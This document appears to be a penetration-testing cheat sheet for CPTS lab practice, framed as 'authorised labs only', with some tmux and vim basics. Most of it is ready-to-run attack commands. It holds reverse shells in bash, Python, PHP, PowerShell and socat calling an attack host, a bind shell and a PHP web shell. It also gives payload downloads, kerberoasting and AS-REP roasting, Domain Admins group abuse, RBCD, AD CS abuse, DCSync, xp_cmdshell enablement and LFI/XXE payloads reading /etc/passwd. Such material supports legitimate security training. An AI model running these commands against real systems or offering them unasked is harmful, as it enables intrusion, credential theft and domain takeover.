---
title: "PoC Snippets"
description: "Copy-paste commands for common CPTS actions: shells, transfer, AD, web, pivoting, and cracking."
category: "Field Manual"
tags: ["field-manual", "cpts", "toolkit", "snippets"]
date: 2026-11-11
published: true
status: archive
---

# PoC Snippets

Quick reference. Replace IPs, domains, and credentials. Authorised labs only.

## Listeners

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## Reverse shells

```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
php -r '$s=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## TTY upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## File transfer

```bash
python3 -m http.server 8000
impacket-smbserver share . -smb2support
```

```cmd
certutil -urlcache -split -f http://10.10.14.5:8000/tool.exe C:\Users\Public\tool.exe
```

```powershell
Invoke-WebRequest http://10.10.14.5:8000/tool.exe -OutFile C:\Users\Public\tool.exe
```

## AD quick checks

```bash
nxc smb $DC_IP -u '' -p '' --rid-brute 10000
nxc smb $DC_IP -u "$USER" -p "$PASS" -d $DOMAIN --pass-pol
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d $DOMAIN --kerberoasting kerb.txt
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d $DOMAIN --asreproast asrep.txt
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns $DC_IP -c All --zip
```

## Roasting

```bash
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -request -outputfile kerb.txt
impacket-GetNPUsers "$DOMAIN/" -usersfile users.txt -dc-ip $DC_IP -no-pass -format hashcat -outputfile asrep.txt
hashcat -m 13100 kerb.txt rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

## ACL

```bash
bloodyAD -u "$USER" -p "$PASS" -d "$DOMAIN" --host $DC_IP get writable --detail
bloodyAD -u "$USER" -p "$PASS" -d "$DOMAIN" --host $DC_IP add groupMember "Domain Admins" "$USER"
bloodyAD -u "$USER" -p "$PASS" -d "$DOMAIN" --host $DC_IP set password "TARGET" 'NewPass123!'
```

## Delegation

```bash
impacket-getST -spn cifs/DC01.target.htb -impersonate administrator \
  "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass dc01.target.htb
```

```bash
impacket-addcomputer "$DOMAIN/$USER:$PASS" -computer-name 'EVIL$' -computer-pass 'Pass123!' -dc-ip $DC_IP
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write -dc-ip $DC_IP "$DOMAIN/$USER:$PASS"
impacket-getST -spn cifs/TARGET.target.htb -impersonate administrator "$DOMAIN/EVIL$:Pass123!" -dc-ip $DC_IP
```

## AD CS

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -vulnerable -stdout
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca "$CA" -template "$TEMPLATE" -upn "administrator@$DOMAIN" -dc-ip $DC_IP
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

## DCSync

```bash
impacket-secretsdump "$DOMAIN/$USER:$PASS@$DC_IP" -just-dc
```

## MSSQL

```bash
impacket-mssqlclient "$DOMAIN/$USER:$PASS@$IP" -windows-auth
```

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Web

```bash
ffuf -u http://$IP/FUZZ -w wordlist.txt -mc all -fs 0
sqlmap -u "http://$IP/?id=1" --batch --dbs
curl -s http://$IP/.git/HEAD
```

```text
../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
{{7*7}}
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

## Pivot

```bash
ssh -D 1080 -N -f user@$JUMP
proxychains nmap -sT -Pn -p 22,80,445 10.10.20.0/24
chisel server -p 8080 --reverse
chisel client 10.10.14.5:8080 R:socks
```

## Cracking

```bash
hashcat -m 1000 ntlm.txt rockyou.txt
hashcat -m 5600 netntlmv2.txt rockyou.txt
hashcat -m 13100 kerb.txt rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt
john --format=NT ntlm.txt --wordlist=rockyou.txt
```

## Cleanup reminders

```bash
# Linux
rm -f /tmp/tool /tmp/shell.sh
crontab -l    # remove injected jobs

# Windows
sc delete <service>
schtasks /delete /tn <task> /f
reg delete HKCU\Software\Classes\ms-settings /f
```

Document every change before deleting it.

## Getting Started — workstation basics

### VPN, interface, and route checks

Keep OpenVPN running in its own terminal or tmux window. In another window, identify the VPN interface and routes before choosing a callback address:

```bash
sudo openvpn user.ovpn
```

```bash
ip a
netstat -rn
ssh user@10.10.10.10
ftp -p 10.10.10.10
```

Use the interface reachable from the target, commonly `tun0` in the training VPN. `netstat -rn` displays numeric routes; `ip route` is its modern equivalent. SSH provides a stable authenticated session when credentials are available; FTP's `-p` selects passive mode.

### tmux workspace

On a Debian-based workstation, install tmux if needed, then create or reattach to a named session:

```bash
sudo apt install tmux -y
tmux new-session -s assessment
tmux ls
tmux attach-session -t assessment
```

Press and release the default prefix **Ctrl+b**, then the next key:

| Key sequence | Action |
|---|---|
| Prefix, `c` | Create a window. |
| Prefix, `0` / `1` / another number | Select that window. |
| Prefix, `%` | Split into left/right panes. |
| Prefix, `"` | Split into top/bottom panes. |
| Prefix, arrow key | Move to the neighbouring pane. |
| Prefix, `d` | Detach while leaving the session running. |

### Vim essentials

```bash
vim notes.txt
```

Vim starts in normal mode. Use `i` to insert text and **Esc** to return to normal mode before navigation/editing commands or `:` commands.

| Key/command | Action |
|---|---|
| `i` | Enter insert mode. |
| `Esc` | Return to normal mode. |
| `x` | Cut the character under the cursor. |
| `dw` | Cut a word. |
| `dd` | Cut a line. |
| `yw` | Copy a word. |
| `yy` | Copy a line. |
| `p` | Paste after the cursor or line. |
| `4yw` | Copy four words; a numeric prefix repeats the operation. |
| `:1` | Jump to line 1. |
| `:w` | Save. |
| `:q` | Quit when no unsaved changes remain. |
| `:q!` | Quit without saving. |
| `:wq` | Save and quit. |

## Getting Started — network and shell helpers

### Netcat banner and listener flags

Connect to a listening service to read its initial banner:

```bash
nc -nv 10.10.10.10 22
```

An SSH version string identifies the service; this TCP connection is not an authenticated SSH session. The existing listener snippets use these flags:

| Flag | Meaning |
|---|---|
| `-l` | Listen for an incoming connection. |
| `-v` | Print connection/status information. |
| `-n` | Use numeric addresses without DNS lookups. |
| `-p 4444` | Specify the local port in the listener syntax shown above. |

### Basic service discovery

Set `IP` to the target. The first Nmap command uses its default common TCP ports; the second checks all TCP ports with version detection and default scripts.

```bash
nmap "$IP"
nmap -sV -sC -p- "$IP"
nmap --script smb-os-discovery.nse -p445 "$IP"
smbclient -N -L "//$IP"
snmpwalk -v 2c -c public "$IP" 1.3.6.1.2.1.1.5.0
onesixtyone -c dict.txt "$IP"
```

`smbclient -N -L` attempts share listing without a password prompt. The SNMP OID queries `sysName`; [onesixtyone](https://github.com/trailofbits/onesixtyone) tests community strings from the supplied `dict.txt`. Check the observed service directly rather than inferring the OS from a port number alone.

### socat target side for the existing TTY listener

Start the socat listener from **Listeners** on the attack host, then run the following on a Linux target with socat available:

```bash
socat TCP:10.10.14.5:4444 EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane
```

The `pty`/session options supply an interactive terminal and signal handling. The reference links [static binaries](https://github.com/andrew-d/static-binaries) for hosts without a suitable installed socat binary; select the target architecture.

### Shell connection direction

| Shell | Connection direction | Prerequisite |
|---|---|---|
| Reverse | Target → attack-host listener | The target can reach the listener's IP and port. |
| Bind | Attack host → target listener | The target's listening port is reachable from the attack host. |
| Web | HTTP client → application endpoint | The uploaded script is stored in a location the web server executes. |

### FIFO reverse and bind shells

Use an unused FIFO path for each run and record it for cleanup. These examples avoid requiring Netcat's optional `-e` feature.

Reverse shell, run on the target after starting the existing Netcat listener:

```bash
mkfifo /tmp/poc-reverse.fifo && (cat /tmp/poc-reverse.fifo | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/poc-reverse.fifo)
```

Bind shell, run on the target:

```bash
mkfifo /tmp/poc-bind.fifo && (cat /tmp/poc-bind.fifo | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/poc-bind.fifo)
```

Connect from the attack host:

```bash
nc -nv 10.10.10.10 4444
```

These are single-connection examples; reconnecting requires the target listener to be running again.

### PowerShell reverse shell

Run inside PowerShell on the target with the attack-host Netcat listener already running:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444); $stream = $client.GetStream(); [byte[]]$buffer = 0..65535 | ForEach-Object {0}; while (($count = $stream.Read($buffer,0,$buffer.Length)) -ne 0) { $command = [Text.Encoding]::ASCII.GetString($buffer,0,$count); $output = (Invoke-Expression $command 2>&1 | Out-String) + 'PS ' + (Get-Location).Path + '> '; $bytes = [Text.Encoding]::ASCII.GetBytes($output); $stream.Write($bytes,0,$bytes.Length); $stream.Flush() }; $client.Close()
```

### Minimal PHP command endpoint

Save as `shell.php` and place it through the confirmed upload/write path in a PHP-executing web directory:

```php
<?php system($_REQUEST["cmd"]); ?>
```

Invoke the endpoint with a URL-encoded command:

```bash
curl -G --data-urlencode 'cmd=id' 'http://10.10.10.10/shell.php'
```

Confirm the actual webroot and handler configuration. The reference gives `/var/www/html/` for a typical Apache installation, `/usr/local/nginx/html/` for a source-style Nginx installation, `C:\inetpub\wwwroot\` for IIS, and `C:\xampp\htdocs\` for XAMPP; these are installation examples rather than universal paths.

### Match terminal dimensions after the TTY upgrade

Read the terminal type and dimensions in a separate local terminal:

```bash
echo "$TERM"
stty size
```

Set the remote `TERM` to the local value using the existing TTY-upgrade step. If `stty size` returned `67 318`, run in the remote shell:

```bash
stty rows 67 columns 318
```

## Getting Started — transfer and validation

Use the existing Python HTTP server on the attack host. On the target, download with either available client:

```bash
wget http://10.10.14.5:8000/linenum.sh -O linenum.sh
curl http://10.10.14.5:8000/linenum.sh -o linenum.sh
```

With SSH access, upload directly from the attack host:

```bash
scp linenum.sh user@10.10.10.10:/tmp/linenum.sh
```

For a text-only transfer, encode locally as one line:

```bash
base64 -w 0 ./tool
```

Set `B64_PAYLOAD` on the receiving host to that complete encoded line, then decode it:

```bash
printf '%s' "$B64_PAYLOAD" | base64 -d > ./tool
```

Inspect the received file and compare the checksum with the original before use:

```bash
file ./tool
md5sum ./tool
```

Reference aids: [tmux key cheatsheet](https://tmuxcheatsheet.com/), [Vim cheatsheet](https://vimsheet.com/), [socat TTY upgrade walkthrough](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat), and [reverse-shell recipes](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/).
